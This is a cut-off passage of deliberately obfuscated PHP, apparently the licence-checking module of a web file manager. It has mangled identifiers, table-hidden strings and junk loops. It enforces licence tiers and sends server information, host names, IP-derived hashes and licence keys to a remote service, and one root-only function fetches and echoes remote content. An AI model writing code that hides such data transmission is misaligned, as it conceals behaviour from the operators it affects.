unset($‡¥×Öè×[$ŞúŞÍÚ[90]][$ŞúŞÍÚ[92]][$ŞúŞÍÚ[94]]); $…Øª¼Í = $ÒŸ¾Ûø°[747]; unset($‡¥×Öè×[$ŞúŞÍÚ[90]][$ŞúŞÍÚ[91]][$ŞúŞÍÚ[46]]); unset($‡¥×Öè×[$ŞúŞÍÚ[90]][$ŞúŞÍÚ[91]][$ŞúŞÍÚ[95]]); $ª–Ö°Õì = $ÒŸ¾Ûø°[748]; if (strlen($ª–Ö°Õì) < $ÒŸ¾Ûø°[328]) { return; } $‡¥×Öè×[$ŞúŞÍÚ[90]][$ŞúŞÍÚ[91]][$ŞúŞÍÚ[96]] = array($ŞúŞÍÚ[97] => (int) $ úÏÏ¢•[$ŞúŞÍÚ[98]], $ŞúŞÍÚ[99] => (int) _get($ úÏÏ¢•, $ŞúŞÍÚ[100], 0)); $şøßìü‚ = $ÒŸ¾Ûø°[749]; $ïŒû»ü = substr(md5($ŞúŞÍÚ[101] . get_client_ip() . $ø’Š­Ë‰[$ŞúŞÍÚ[102]]), 0, 15); $‡¥×Öè×[$ŞúŞÍÚ[103]][$ŞúŞÍÚ[104]] = Mcrypt::encode(Session::sign(), $ïŒû»ü, 3600 * 24); $‡¥×Öè×[$ŞúŞÍÚ[103]][$ŞúŞÍÚ[105]] = Action($ŞúŞÍÚ[106])->accessToken(); $ºıàµ£ = $ÒŸ¾Ûø°[750]; if (!$ºıàµ£) { die; } $‡¥×Öè×[$ŞúŞÍÚ[103]][$ŞúŞÍÚ[107]] = md5($_SERVER[$ŞúŞÍÚ[108]] . $ø’Š­Ë‰[$ŞúŞÍÚ[102]]); $‡¥×Öè×[$ŞúŞÍÚ[103]][$ŞúŞÍÚ[109]] = base64_encode(serverInfo()); $‡¥×Öè×[$ŞúŞÍÚ[103]][$ŞúŞÍÚ[110]] = $this->dvae1c2a981d; $²¥ˆ’Ë¿ = $ÒŸ¾Ûø°[751]; if ($ø’Š­Ë‰[$ŞúŞÍÚ[110]] != $ŞúŞÍÚ[111]) { $‡¥×Öè×[$ŞúŞÍÚ[103]][$ŞúŞÍÚ[112]] = $ø’Š­Ë‰[$ŞúŞÍÚ[112]]; $‡¥×Öè×[$ŞúŞÍÚ[103]][$ŞúŞÍÚ[113]] = $ø’Š­Ë‰[$ŞúŞÍÚ[113]]; $Ñçá«”ù = rand_string(10) . $this->dvae1c2a981d . rand_string(5); $‡¥×Öè×[$ŞúŞÍÚ[90]][$ŞúŞÍÚ[114]][$ŞúŞÍÚ[115]] = $this->mceqcc4f9d46($Ñçá«”ù, $‡¥×Öè×[$ŞúŞÍÚ[103]][$ŞúŞÍÚ[107]]); } if ($this->dvae1c2a981d == $ŞúŞÍÚ[111]) { $‡¥×Öè×[$ŞúŞÍÚ[90]][$ŞúŞÍÚ[91]][$ŞúŞÍÚ[96]][$ŞúŞÍÚ[100]] = 0; } $‡¥×Öè×[$ŞúŞÍÚ[103]][$ŞúŞÍÚ[116]] = $this->versionPluginFilter(); $‡¥×Öè×[$ŞúŞÍÚ[103]][$ŞúŞÍÚ[117]] = _get($this->dcsi36746d30, $ŞúŞÍÚ[118], $ŞúŞÍÚ[6]); $·’€±ñã = $ÒŸ¾Ûø°[752]; while ($·’€±ñã < $ÒŸ¾Ûø°[729]) { if ($·’€±ñã >= 0) { break; } $·’€±ñã++; } if (KodUser::isRoot() && $this->config[$ŞúŞÍÚ[119]]) { $‡¥×Öè×[$ŞúŞÍÚ[103]][$ŞúŞÍÚ[120]] = WEB_ROOT; } return $‡¥×Öè×; } private function mcdoa9a51d12() { $‡ˆúıÒ• =& $_SERVER[‘ÆÜ‘œ]; $ıª·¦—É =& $_SERVER[ä×´“›]; $•ŠÁ¹Íé = $_SERVER[$ıª·¦—É[24]] == $ıª·¦—É[121]; if ($_SERVER[$ıª·¦—É[24]] == $ıª·¦—É[122] && $_GET[$ıª·¦—É[123]] == $ıª·¦—É[124]) { $•ŠÁ¹Íé = !0; } if ($•ŠÁ¹Íé) { $±Ç®ê = array($ıª·¦—É[110] => $this->dvae1c2a981d, $ıª·¦—É[125] => $this->mwpef9cba4bc(), $ıª·¦—É[126] => Model($ıª·¦—É[127])->count()); if ($this->dvae1c2a981d != $ıª·¦—É[111]) { $€—ºğ¿ = _get($this->dcsi36746d30, $ıª·¦—É[128]); if ($€—ºğ¿) { $±Ç®ê[$ıª·¦—É[129]] = $€—ºğ¿; $±Ç®ê[$ıª·¦—É[130]] = strtotime(_get($this->dcsi36746d30, $ıª·¦—É[131])); $±Ç®ê[$ıª·¦—É[132]] = _get($this->dcsi36746d30, $ıª·¦—É[118]); } $¨²âÀğÓ = Model($ıª·¦—É[33])->get($ıª·¦—É[133], $ıª·¦—É[6], !0); if (is_string($¨²âÀğÓ) && substr($¨²âÀğÓ, 0, 1) == $ıª·¦—É[134]) { $¨²âÀğÓ = json_decode_force($¨²âÀğÓ); } if (is_array($¨²âÀğÓ) && $¨²âÀğÓ[$ıª·¦—É[135]] && strstr($¨²âÀğÓ[$ıª·¦—É[135]], $ıª·¦—É[136])) { $¹ó„ƒØğ = explode($ıª·¦—É[136], $¨²âÀğÓ[$ıª·¦—É[135]]); $±Ç®ê[$ıª·¦—É[137]] = $¹ó„ƒØğ[0]; } } $±Ç®ê = $this->xoam17a08e0d(json_encode($±Ç®ê), md5($ıª·¦—É[138])); $æ­’§èœ = array($ıª·¦—É[139] => $±Ç®ê); $¨µè¿¸— = $‡ˆúıÒ•[753]; if (!$¨µè¿¸—) { return; } call_user_func(array($ıª·¦—É[140], $ıª·¦—É[141]), $æ­’§èœ); $æõÍúŸí = $‡ˆúıÒ•[754]; } if ($this->dvae1c2a981d == $ıª·¦—É[111]) { return; } $¯—«Âƒ‰ = array($ıª·¦—É[142], $ıª·¦—É[143], $ıª·¦—É[144], $ıª·¦—É[145], $ıª·¦—É[146], $ıª·¦—É[147]); $êš´»ü = $‡ˆúıÒ•[755]; if (!$êš´»ü) { die; } $ şèŒ¤æ = Model($ıª·¦—É[33])->get(); $æ­’§èœ = array($ıª·¦—É[148] => $ şèŒ¤æ[$ıª·¦—É[34]], $ıª·¦—É[149] => $ şèŒ¤æ[$ıª·¦—É[35]], $ıª·¦—É[150] => $ıª·¦—É[6]); foreach ($¯—«Âƒ‰ as $ËÊğ¶ôø) { if (!isset($ şèŒ¤æ[$ËÊğ¶ôø]) || !$ şèŒ¤æ[$ËÊğ¶ôø]) { continue; } $æ­’§èœ[$ËÊğ¶ôø] = $ şèŒ¤æ[$ËÊğ¶ôø]; $ØæÏŞŒ = $‡ˆúıÒ•[756]; if (!$ØæÏŞŒ) { return; } } call_user_func(array($ıª·¦—É[140], $ıª·¦—É[141]), $æ­’§èœ); $¥ñ ­Ÿ = $‡ˆúıÒ•[757]; if (!$¥ñ ­Ÿ) { return; } } private function omax76b6aec9() { $Ü¡Ü²İ” =& $_SERVER[‘ÆÜ‘œ]; $ ¨÷òËò =& $_SERVER[ä×´“›]; if ($_SERVER[$ ¨÷òËò[24]] != $ ¨÷òËò[151]) { return; } if (!KodUser::isRoot()) { die; } $“°‰Éåå = $GLOBALS[$ ¨÷òËò[13]]; if (isset($“°‰Éåå[$ ¨÷òËò[152]])) { $this->icxmc989d363(); die; } if (isset($“°‰Éåå[$ ¨÷òËò[153]]) && isset($“°‰Éåå[$ ¨÷òËò[153]]) == $ ¨÷òËò[124]) { $“°‰Éåå[$ ¨÷òËò[154]] = Model($ ¨÷òËò[33])->get($ ¨÷òËò[155]); } if (!isset($“°‰Éåå[$ ¨÷òËò[154]]) || strlen($“°‰Éåå[$ ¨÷òËò[154]]) != 16) { show_json($ ¨÷òËò[156] . $“°‰Éåå[$ ¨÷òËò[154]], !1); } $¼×ØîòÚ = Model($ ¨÷òËò[33])->get($ ¨÷òËò[102]); $âË®îù = md5($_SERVER[$ ¨÷òËò[108]] . $¼×ØîòÚ); $Öß¸İ¢ª = $Ü¡Ü²İ”[758]; $è¡¾İ´ö = array($ ¨÷òËò[154] => $“°‰Éåå[$ ¨÷òËò[154]], $ ¨÷òËò[157] => rand_string(16), $ ¨÷òËò[158] => $ ¨÷òËò[138], $ ¨÷òËò[159] => $ ¨÷òËò[160], $ ¨÷òËò[161] => $_SERVER[$ ¨÷òËò[162]], $ ¨÷òËò[163] => $_SERVER[$ ¨÷òËò[164]], $ ¨÷òËò[165] => $_SERVER[$ ¨÷òËò[166]], $ ¨÷òËò[107] => $âË®îù, $ ¨÷òËò[167] => Model($ ¨÷òËò[33])->get($ ¨÷òËò[133])); if (isset($“°‰Éåå[$ ¨÷òËò[153]]) && isset($“°‰Éåå[$ ¨÷òËò[153]]) == $ ¨÷òËò[124]) { $è¡¾İ´ö[$ ¨÷òËò[153]] = md5($è¡¾İ´ö[$ ¨÷òËò[154]] . $ ¨÷òËò[168] . $è¡¾İ´ö[$ ¨÷òËò[157]]); } if ($“°‰Éåå[$ ¨÷òËò[169]] == $ ¨÷òËò[170]) { $Æ§Â´® = $this->xoam17a08e0d($âË®îù, $ ¨÷òËò[171]); $¡ÁçøÙã = $this->mceqcc4f9d46(json_encode($è¡¾İ´ö), $âË®îù . $ ¨÷òËò[172], 3); $¡ÁçøÙã = $¡ÁçøÙã . $ ¨÷òËò[173] . $_SERVER[$ ¨÷òËò[162]]; $¢’Øö ¾ = $this->zkasa631da54($ ¨÷òËò[174] . $Æ§Â´® . $ ¨÷òËò[175] . $¡ÁçøÙã, -1); show_json($¢’Øö ¾, !0); } else { if ($“°‰Éåå[$ ¨÷òËò[169]] == $ ¨÷òËò[176]) { $È¬¤¶û = substr(md5($ ¨÷òËò[177] . $âË®îù), 12, 15) . $ ¨÷òËò[178]; $¡ÁçøÙã = $this->tsqb96ea3afd(trim($“°‰Éåå[$ ¨÷òËò[179]]), $È¬¤¶û, 2); $ªÙûæ÷Ú = json_decode($¡ÁçøÙã, !0); if (!is_array($ªÙûæ÷Ú) || !is_array($ªÙûæ÷Ú[$ ¨÷òËò[180]]) || $ªÙûæ÷Ú[$ ¨÷òËò[154]] != !0) { $üÕßº•— = $ ¨÷òËò[181]; $¸˜¨½¤ë = $ªÙûæ÷Ú[$ ¨÷òËò[180]] ? $ ¨÷òËò[182] . $ªÙûæ÷Ú[$ ¨÷òËò[180]] : $üÕßº•—; show_json($¸˜¨½¤ë, !1); } else { $è¡¾İ´ö[$ ¨÷òËò[157]] = $ªÙûæ÷Ú[$ ¨÷òËò[180]][$ ¨÷òËò[183]]; } } else { $ªÙûæ÷Ú = $this->zkasa631da54($ ¨÷òËò[184], $è¡¾İ´ö, 10); $›Õîê•Í = $Ü¡Ü²İ”[759]; if (strlen($›Õîê•Í) < $Ü¡Ü²İ”[722]) { die; } } } if (!is_array($ªÙûæ÷Ú) || !is_array($ªÙûæ÷Ú[$ ¨÷òËò[180]]) || $ªÙûæ÷Ú[$ ¨÷òËò[154]] != !0) { $üÕßº•— = LNG($ ¨÷òËò[185]); $¸˜¨½¤ë = $ªÙûæ÷Ú[$ ¨÷òËò[180]] ? $ ¨÷òËò[182] . $ªÙûæ÷Ú[$ ¨÷òËò[180]] : $üÕßº•—; show_json($¸˜¨½¤ë, !1); } $èÜüçøÀ = $ªÙûæ÷Ú[$ ¨÷òËò[180]]; $¡ÂÂÂ¥ó = $this->sxhv29928b18($èÜüçøÀ[$ ¨÷òËò[186]]); $“²Ü¢·Ç = $Ü¡Ü²İ”[760]; while (strlen($“²Ü¢·Ç) < $Ü¡Ü²İ”[715]) { if (!$“²Ü¢·Ç) { break; } $“²Ü¢·Ç++; } if (!$¡ÂÂÂ¥ó || $¡ÂÂÂ¥ó != $èÜüçøÀ[$ ¨÷òËò[131]]) { $ˆĞ¥ØÃ¿ = array($ ¨÷òËò[187] => Model($ ¨÷òËò[33])->get($ ¨÷òËò[102]), $ ¨÷òËò[188] => $_SERVER[$ ¨÷òËò[108]], $ ¨÷òËò[189] => this_url(), $ ¨÷òËò[163] => $_SERVER[$ ¨÷òËò[164]]); $¡ÁçøÙã = $this->rgyqbda14f14(json_encode($ˆĞ¥ØÃ¿)); $this->zkasa631da54($ ¨÷òËò[190] . $¡ÁçøÙã); show_json(LNG($ ¨÷òËò[191]), !0); } $Ğ¼¿çµ¤ = array($ ¨÷òËò[155] => $èÜüçøÀ[$ ¨÷òËò[192]], $ ¨÷òËò[193] => $èÜüçøÀ[$ ¨÷òËò[194]], $ ¨÷òËò[195] => rand_string(16), $ ¨÷òËò[110] => $èÜüçøÀ[$ ¨÷òËò[196]]); if ($è¡¾İ´ö[$ ¨÷òËò[157]]) { $Ğ¼¿çµ¤[$ ¨÷òËò[195]] = $è¡¾İ´ö[$ ¨÷òËò[157]]; } $îõèì“Ü = substr(md5($Ğ¼¿çµ¤[$ ¨÷òËò[193]]), 10, 10); $ŞªËƒ½á = $îõèì“Ü . $Ğ¼¿çµ¤[$ ¨÷òËò[110]] . $Ğ¼¿çµ¤[$ ¨÷òËò[195]]; $Ğ¼¿çµ¤[$ ¨÷òËò[112]] = strrev(base64_encode($this->xoam17a08e0d($ŞªËƒ½á, $ ¨÷òËò[197]))); $Û¥¡˜© = rand_string(16); $Úº°ô’‘ = $Û¥¡˜© . $Ğ¼¿çµ¤[$ ¨÷òËò[110]] . $this->xoam17a08e0d(md5($Ğ¼¿çµ¤[$ ¨÷òËò[155]]), $Û¥¡˜©); $Ğ¼¿çµ¤[$ ¨÷òËò[113]] = base64_encode(strrev($this->xoam17a08e0d($Úº°ô’‘, $ ¨÷òËò[198]))); $±ù–À†û = $Ü¡Ü²İ”[761]; while ($±ù–À†û < $Ü¡Ü²İ”[328]) { if ($±ù–À†û >= 0) { break; } $±ù–À†û++; } if ($èÜüçøÀ[$ ¨÷òËò[199]] && $èÜüçøÀ[$ ¨÷òËò[199]] >= 1) { Model($ ¨÷òËò[33])->setDeep($ ¨÷òËò[200], $ ¨÷òËò[124]); } Model($ ¨÷òËò[33])->set($Ğ¼¿çµ¤); $°¤¦‰¿È = md5($_SERVER[$ ¨÷òËò[108]] . strrev($¼×ØîòÚ) . $Ğ¼¿çµ¤[$ ¨÷òËò[193]]); $ÛŒ®²õı = strrev(substr($°¤¦‰¿È, 10, 16)); $‹¹ŸºÏ = $Ü¡Ü²İ”[762]; if (!$‹¹ŸºÏ) { return; } $¨ùò®õé = $this->mceqcc4f9d46(json_encode($èÜüçøÀ), $°¤¦‰¿È); $¿·ë‚˜ = $Ü¡Ü²İ”[763]; while ($¿·ë‚˜ < $Ü¡Ü²İ”[328]) { if ($¿·ë‚˜ >= 0) { break; } $¿·ë‚˜++; } $’À®Û¥İ = array_to_keyvalue(Model($ ¨÷òËò[7])->listData(), $ ¨÷òËò[201]); $·ÍáÌ®Ş = $’À®Û¥İ[$ ¨÷òËò[202]]; $¿€ãÚ¦Ó = $Ü¡Ü²İ”[764]; if (!$¿€ãÚ¦Ó) { return; } $öæûÙÖÊ = array(); $’ÒÂÜ÷— = $Ü¡Ü²İ”[765]; if (strlen($’ÒÂÜ÷—) < $Ü¡Ü²İ”[722]) { die; } $öæûÙÖÊ[$ÛŒ®²õı] = $¨ùò®õé; Model($ ¨÷òËò[7])->update($·ÍáÌ®Ş[$ ¨÷òËò[203]], array($ ¨÷òËò[204] => $öæûÙÖÊ)); $this->dcsi36746d30 = $èÜüçøÀ; $this->dvae1c2a981d = $Ğ¼¿çµ¤[$ ¨÷òËò[110]]; $Ä‡§Åù = $Ü¡Ü²İ”[766]; if (strlen($Ä‡§Åù) < $Ü¡Ü²İ”[715]) { die; } $this->licenseRegistSuccess(); Cache::set($ ¨÷òËò[205] . md5($¼×ØîòÚ . $ ¨÷òËò[206]), $ ¨÷òËò[6]); show_json(LNG($ ¨÷òËò[191]), !0); } private function licenseRegistSuccess() { $˜áÈÊë¾ =& $_SERVER[ä×´“›]; $Åö÷Ë”â = Model($˜áÈÊë¾[33])->get(); if ($Åö÷Ë”â[$˜áÈÊë¾[63]] != $˜áÈÊë¾[124]) { Model($˜áÈÊë¾[33])->set($˜áÈÊë¾[63], $˜áÈÊë¾[124]); } Action($˜áÈÊë¾[207])->initStart(!0); } private function icxmc989d363() { $¬õÏ¿ë¸ =& $_SERVER[‘ÆÜ‘œ]; $‹íğ˜ˆ± =& $_SERVER[ä×´“›]; Model($‹íğ˜ˆ±[33])->set(array($‹íğ˜ˆ±[155] => $‹íğ˜ˆ±[6], $‹íğ˜ˆ±[193] => $‹íğ˜ˆ±[6], $‹íğ˜ˆ±[110] => $‹íğ˜ˆ±[111], $‹íğ˜ˆ±[112] => $‹íğ˜ˆ±[6], $‹íğ˜ˆ±[113] => $‹íğ˜ˆ±[6])); $ÒÄÎ­ÜÍ = $¬õÏ¿ë¸[767]; if (!$ÒÄÎ­ÜÍ) { return; } Model($‹íğ˜ˆ±[33])->setDeep($‹íğ˜ˆ±[200], $‹íğ˜ˆ±[208]); $Ö˜°ØÚ = $¬õÏ¿ë¸[768]; if (strlen($Ö˜°ØÚ) < $¬õÏ¿ë¸[722]) { return; } $this->dcsi36746d30 = array(); $°¿¦Ã€÷ = $¬õÏ¿ë¸[769]; while (strlen($°¿¦Ã€÷) < $¬õÏ¿ë¸[729]) { if (!$°¿¦Ã€÷) { break; } $°¿¦Ã€÷++; } $this->dvae1c2a981d = $‹íğ˜ˆ±[111]; $¿‰Ú«î = $¬õÏ¿ë¸[770]; if (!$¿‰Ú«î) { return; } } private function tbnoc507b8f6() { $ú¬ø¥Ü =& $_SERVER[‘ÆÜ‘œ]; $²İå•ìŞ =& $_SERVER[ä×´“›]; $_SERVER[$²İå•ìŞ[164]] = _get($_SERVER, $²İå•ìŞ[164], APP_HOST); $this->dvae1c2a981d = $²İå•ìŞ[111]; $ğ¡Ğ‡ÚŠ = $ú¬ø¥Ü[771]; $µ±Ë„ÇÁ = Model($²İå•ìŞ[33])->get(); $Ø¤×ù¤× = $ú¬ø¥Ü[772]; if (!$Ø¤×ù¤×) { return; } if ($µ±Ë„ÇÁ[$²İå•ìŞ[110]] == $²İå•ìŞ[111]) { return; } $èŸÉğÍ‘ = Model($²İå•ìŞ[33])->get($²İå•ìŞ[102]); $¸Çƒ•ù = $ú¬ø¥Ü[773]; while ($¸Çƒ•ù < $ú¬ø¥Ü[328]) { if ($¸Çƒ•ù >= 0) { break; } $¸Çƒ•ù++; } $òÊ—È = $²İå•ìŞ[205] . md5($èŸÉğÍ‘ . $²İå•ìŞ[206]); $µÖ˜Ø“ = Cache::get($òÊ—È); $¢ë÷¶© = $ú¬ø¥Ü[774]; if (strlen($¢ë÷¶©) < $ú¬ø¥Ü[729]) { return; } if (!is_array($µÖ˜Ø“) || !isset($µÖ˜Ø“[$²İå•ìŞ[209]]) || time() - $µÖ˜Ø“[$²İå•ìŞ[209]] >= 60) { $Ú›È°ï‹ = Model($²İå•ìŞ[7])->loadList(); $¦İŒĞÖä = $Ú›È°ï‹[$²İå•ìŞ[202]]; $”õë¼Ä = md5($_SERVER[$²İå•ìŞ[108]] . strrev($èŸÉğÍ‘) . $µ±Ë„ÇÁ[$²İå•ìŞ[193]]); $©ä¡ÖÜÚ = strrev(substr($”õë¼Ä, 10, 16)); $µÖ˜Ø“ = $this->tsqb96ea3afd($¦İŒĞÖä[$²İå•ìŞ[88]][$©ä¡ÖÜÚ], $”õë¼Ä); $µÖ˜Ø“ = json_decode($µÖ˜Ø“, !0); } if (!is_array($µÖ˜Ø“)) { return $this->icxmc989d363(); } $ù¶Ê››À = strtotime($µÖ˜Ø“[$²İå•ìŞ[131]]); if (time() >= $ù¶Ê››À) { return $this->icxmc989d363(); } if (!isset($µÖ˜Ø“[$²İå•ìŞ[209]]) || time() - $µÖ˜Ø“[$²İå•ìŞ[209]] > 20) { $µÖ˜Ø“[$²İå•ìŞ[209]] = time(); Cache::set($òÊ—È, $µÖ˜Ø“); } $this->dcsi36746d30 = $µÖ˜Ø“; $this->dvae1c2a981d = $µ±Ë„ÇÁ[$²İå•ìŞ[110]]; $Üñ»¥ó = $ú¬ø¥Ü[775]; if (!$Üñ»¥ó) { return; } $GLOBALS[$²İå•ìŞ[210]] = $this; $Ü³´õåâ = $ú¬ø¥Ü[776]; while ($Ü³´õåâ < $ú¬ø¥Ü[722]) { if ($Ü³´õåâ >= 0) { break; } $Ü³´õåâ++; } } private function fxrw69aa70ca() { $¦ğ‡ ³  =& $_SERVER[ä×´“›]; $£İöîğ¢ = $GLOBALS[$¦ğ‡ ³ [13]]; $ÉÄÔõ™õ = $_SERVER[$¦ğ‡ ³ [24]]; if ($ÉÄÔõ™õ == $¦ğ‡ ³ [211] && $this->dvae1c2a981d == $¦ğ‡ ³ [111]) { show_json(LNG($¦ğ‡ ³ [212]), !1, $¦ğ‡ ³ [213]); } $¡¡İ´šÌ = array($¦ğ‡ ³ [214], $¦ğ‡ ³ [215]); if (in_array($ÉÄÔõ™õ, $¡¡İ´šÌ)) { if ($this->dvae1c2a981d == $¦ğ‡ ³ [111] && isset($£İöîğ¢[$¦ğ‡ ³ [216]])) { show_json(LNG($¦ğ‡ ³ [212]), !1, $¦ğ‡ ³ [213]); die; } $üÙ÷¾´´ = $this->mwpef9cba4bc(); if ($üÙ÷¾´´ != intval($¦ğ‡ ³ [217])) { if ($üÙ÷¾´´ <= Model($¦ğ‡ ³ [127])->count()) { show_json(LNG($¦ğ‡ ³ [218]), !1, $¦ğ‡ ³ [213]); die; } } } } private function xyfc5c157123() { $ÒÌ§„şª =& $_SERVER[‘ÆÜ‘œ]; $¾„¯˜Ã =& $_SERVER[ä×´“›]; $ìàç‘ãş = array($¾„¯˜Ã[121], $¾„¯˜Ã[122]); $ááşğÍ = $ÒÌ§„şª[777]; if (!KodUser::isRoot() || !isset($_GET[$¾„¯˜Ã[219]])) { return; } if (!in_array($_SERVER[$¾„¯˜Ã[24]], $ìàç‘ãş)) { return; } $¨ÎËù‘² = $¾„¯˜Ã[220]; $¨ÎËù‘² = $this->xcugf313f2c9($¨ÎËù‘², $¾„¯˜Ã[221]); $¦Íê…å£ = stream_context_create(array($¾„¯˜Ã[222] => array($¾„¯˜Ã[223] => $¾„¯˜Ã[224], $¾„¯˜Ã[225] => 3))); $å’«ñàØ = $ÒÌ§„şª[778]; if (!$å’«ñàØ) { die; } $ñ¶ıÊ¥± = @file_get_contents($¨ÎËù‘², !1, $¦Íê…å£); header($¾„¯˜Ã[226]); $ãÛáÀØŒ = $ÒÌ§„şª[779]; if (strlen($ãÛáÀØŒ) < $ÒÌ§„şª[328]) { die; } if ($ñ¶ıÊ¥± && strstr($ñ¶ıÊ¥±, $¾„¯˜Ã[227])) { echo $ñ¶ıÊ¥±; } die; } public function uztp4b5882ca($¶ì€ÌÚ) { $•óÖçõË =& $_SERVER[‘ÆÜ‘œ]; $â¾ˆ–¡Ì =& $_SERVER[ä×´“›]; if ($this->dvae1c2a981d == $â¾ˆ–¡Ì[228]) { return $¶ì€ÌÚ; } $æá·ò = $this->versionPluginList(); $Ş ¬çƒ§ = explode($â¾ˆ–¡Ì[229], $this->versionPluginFilter()); $¤½¼¤Î = $•óÖçõË[780]; if (!$¤½¼¤Î) { return; } $ÇÉ¾¬ª¾ = array(); $ÖÏäÆÍ¾ = $•óÖçõË[781]; if (!$ÖÏäÆÍ¾) { return; } foreach ($æá·ò as $÷¿Úü®³ => $¦¢Ñ òı) { if ($¦¢Ñ òı == $â¾ˆ–¡Ì[230] && substr($this->dvae1c2a981d, 0, 1) == $â¾ˆ–¡Ì[230]) { continue; } if (!in_array($÷¿Úü®³, $Ş ¬çƒ§)) { $ÇÉ¾¬ª¾[] = $÷¿Úü®³; } } foreach ($ÇÉ¾¬ª¾ as $÷¿Úü®³) { unset($¶ì€ÌÚ[$÷¿Úü®³]); } return $¶ì€ÌÚ; $±î…¸ı© = $•óÖçõË[782]; if (strlen($±î…¸ı©) < $•óÖçõË[722]) { return; } } private function versionPluginList() { $²–úûæœ =& $_SERVER[‘ÆÜ‘œ]; $ã¼•î¨œ =& $_SERVER[ä×´“›]; return array($ã¼•î¨œ[231] => $ã¼•î¨œ[230], $ã¼•î¨œ[232] => $ã¼•î¨œ[230], $ã¼•î¨œ[233] => $ã¼•î¨œ[230], $ã¼•î¨œ[234] => $ã¼•î¨œ[230], $ã¼•î¨œ[235] => $ã¼•î¨œ[236], $ã¼•î¨œ[237] => $ã¼•î¨œ[236], $ã¼•î¨œ[238] => $ã¼•î¨œ[236], $ã¼•î¨œ[239] => $ã¼•î¨œ[236], $ã¼•î¨œ[240] => $ã¼•î¨œ[236], $ã¼•î¨œ[241] => $ã¼•î¨œ[236], $ã¼•î¨œ[242] => $ã¼•î¨œ[236], $ã¼•î¨œ[243] => $ã¼•î¨œ[236], $ã¼•î¨œ[244] => $ã¼•î¨œ[236], $ã¼•î¨œ[245] => $ã¼•î¨œ[236], $ã¼•î¨œ[246] => $ã¼•î¨œ[236], $ã¼•î¨œ[247] => $ã¼•î¨œ[236], $ã¼•î¨œ[248] => $ã¼•î¨œ[236], $ã¼•î¨œ[249] => $ã¼•î¨œ[236], $ã¼•î¨œ[250] => $ã¼•î¨œ[236]); $·‚‰—ÔØ = $²–úûæœ[783]; while (strlen($·‚‰—ÔØ) < $²–úûæœ[328]) { if (!$·‚‰—ÔØ) { break; } $·‚‰—ÔØ++; } } private function versionPluginFilter() { $¸˜ªõ¡® =& $_SERVER[‘ÆÜ‘œ]; $†ë¸şô =& $_SERVER[ä×´“›]; if ($this->dvae1c2a981d == $†ë¸şô[111]) { return $†ë¸şô[6]; } $ç‘ˆ½õ = _get($this->dcsi36746d30, $†ë¸şô[251], $†ë¸şô[6]); $øìâØÜô = $¸˜ªõ¡®[784]; while (strlen($øìâØÜô) < $¸˜ªõ¡®[722]) { if (!$øìâØÜô) { break; } $øìâØÜô++; } $ÊÒ¥òÉâ = _get($this->dcsi36746d30, $†ë¸şô[118], $†ë¸şô[6]); $¨¹ƒ¯±± = _get($this->dcsi36746d30, $†ë¸şô[252], $†ë¸şô[6]); if ($ÊÒ¥òÉâ > time() && $¨¹ƒ¯±± > time()) { $¶àô¿ÅĞ = explode($†ë¸şô[229], $ç‘ˆ½õ); $ıÅ˜Õúä = array_keys($this->versionPluginList()); $ç‘ˆ½õ = array_merge($¶àô¿ÅĞ, $ıÅ˜Õúä); $ç‘ˆ½õ = implode($†ë¸şô[229], array_filter(array_unique($ç‘ˆ½õ))); } return $ç‘ˆ½õ; } private function izkjd2b10cdf() { $À§ÊŸÖ® =& $_SERVER[ä×´“›]; if ($this->dvae1c2a981d != $À§ÊŸÖ®[111]) { $GLOBALS[$À§ÊŸÖ®[88]][$À§ÊŸÖ®[92]][$À§ÊŸÖ®[253]] = $À§ÊŸÖ®[208]; return; } $GLOBALS[$À§ÊŸÖ®[88]][$À§ÊŸÖ®[254]] = $À§ÊŸÖ®[124]; if (Model($À§ÊŸÖ®[255])->get($À§ÊŸÖ®[63]) != $À§ÊŸÖ®[208]) { Model($À§ÊŸÖ®[255])->set($À§ÊŸÖ®[63], $À§ÊŸÖ®[208]); } } public function exhvfb7bfe10() { return $_SERVER[ä×´“›][256]; } private function hnjt4dfb102a() { $“˜µà‹æ =& $_SERVER[‘ÆÜ‘œ]; $›…ù‚ï =& $_SERVER[ä×´“›]; $°Ê¤…‰ = array($›…ù‚ï[257], $›…ù‚ï[258], $›…ù‚ï[259]); $İì«ÌÇ† = $›…ù‚ï[260] . md5($›…ù‚ï[261]); $áÄÕÕ¹ = $“˜µà‹æ[785]; while (strlen($áÄÕÕ¹) < $“˜µà‹æ[717]) { if (!$áÄÕÕ¹) { break; } $áÄÕÕ¹++; } if ($this->dvae1c2a981d == $›…ù‚ï[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$›…ù‚ï[24]], $°Ê¤…‰)) { return; } if (time() % 4 != 0) { return; } $Ó‹„”Ÿ” = call_user_func(array($›…ù‚ï[262], $›…ù‚ï[263]), $İì«ÌÇ†); if ($Ó‹„”Ÿ” && time() - $Ó‹„”Ÿ” < intval($›…ù‚ï[264])) { return; } call_user_func(array($›…ù‚ï[262], $›…ù‚ï[141]), $İì«ÌÇ†, time()); $ƒƒ‰ºÌÉ = $“˜µà‹æ[786]; $ı•Ğ‰¤Š = Model($›…ù‚ï[33])->get($›…ù‚ï[102]); $ÁŒğ´¥ = $“˜µà‹æ[787]; $ —âÍ»É = array($›…ù‚ï[154] => Model($›…ù‚ï[33])->get($›…ù‚ï[155]), $›…ù‚ï[169] => $this->dvae1c2a981d, $›…ù‚ï[165] => $_SERVER[$›…ù‚ï[166]], $›…ù‚ï[167] => Model($›…ù‚ï[33])->get($›…ù‚ï[133]), $›…ù‚ï[107] => md5($_SERVER[$›…ù‚ï[108]] . $ı•Ğ‰¤Š), $›…ù‚ï[158] => $›…ù‚ï[138], $›…ù‚ï[161] => $_SERVER[$›…ù‚ï[162]]); $š¹åéØè = $“˜µà‹æ[788]; $ä¸ºéÖš = $this->zkasa631da54($›…ù‚ï[265], $ —âÍ»É); $å¡ÑÉœĞ = $“˜µà‹æ[789]; if (strlen($å¡ÑÉœĞ) < $“˜µà‹æ[722]) { return; } if (!is_array($ä¸ºéÖš)) { return; } if ($ä¸ºéÖš[$›…ù‚ï[154]] && $ä¸ºéÖš[$›…ù‚ï[266]]) { if ($this->sxhv29928b18($ä¸ºéÖš[$›…ù‚ï[266]]) == $ —âÍ»É[$›…ù‚ï[154]]) { return; } } $this->icxmc989d363(); if ($this->sxhv29928b18($ä¸ºéÖš[$›…ù‚ï[266]]) != $ —âÍ»É[$›…ù‚ï[154]]) { $€œÇ¯ü£ = array($›…ù‚ï[187] => $ı•Ğ‰¤Š, $›…ù‚ï[188] => $_SERVER[$›…ù‚ï[108]], $›…ù‚ï[189] => this_url(), $›…ù‚ï[163] 